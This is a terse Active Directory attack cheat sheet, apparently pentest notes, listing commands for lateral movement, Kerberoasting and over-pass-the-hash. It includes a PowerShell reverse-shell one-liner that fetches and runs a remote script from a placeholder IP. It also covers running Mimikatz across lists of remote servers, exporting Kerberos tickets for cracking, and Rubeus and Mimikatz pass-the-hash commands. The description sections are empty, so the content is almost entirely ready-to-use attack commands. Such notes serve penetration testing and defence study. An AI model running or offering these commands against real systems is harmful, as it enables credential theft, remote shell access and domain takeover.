# AD - Lateral Movement / Connections

## **Connections**

**Access C disk of a computer (check local admin)**\
ls \\\\\[hostname]\c$

**Connect to machine with administrator privs**\
****Enter-PSSession -Computername

**Save and use sessions of a machine**\
****$sess = New-PSSession -Computername\
Enter-PSSession $sess

**Powershell reverse shell**\
powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000

**Execute commands on a machine**\
Invoke-Command -Computername -Scriptblock {whoami}\
Invoke-Command -Computername -Scriptblock {whoami}

**Load script on a machine**\
****Invoke-Command -Computername -FilePath\
Invoke-Command -FilePath $sess

**Execute locally loaded function on a list of remote machines**\
Invoke-Command -Scriptblock ${function:} -Computername (Get-Content \<list\_of\_servers>)\
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content \<list\_of\_servers>)

**Copy script to other server**\
****Copy-Item .\Invoke-MimikatzEx.ps1 \\\hostname\c$\\'Program Files'\
****

```
```

## **Kerberoasting**

### **Description**

### **Attack commands**

**See existing tickets**\
klist

**Remove all tickets**\
****klist purge

**Request a kerberos service ticket for a specific SPN - output Hashcat format**\
****Powerview - **** Request-SPNTicket -SPN "name/target.domain.local" \[-OutputFormat JTR]

**Manually**\
Add-Type -AssemblyName System.IdentityModel\
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "name/target.domain.local"

**Dump the ticket**\
Invoke-Mimikatz -Command '"kerberos::list /export"'

\=> Now Crack\


## Over-Pass the Hash <a href="#over-pass-the-hash" id="over-pass-the-hash"></a>

### Description



### Attack commands

Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> \[/domain:DOMAIN] \[/opsec] /ptt

sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe



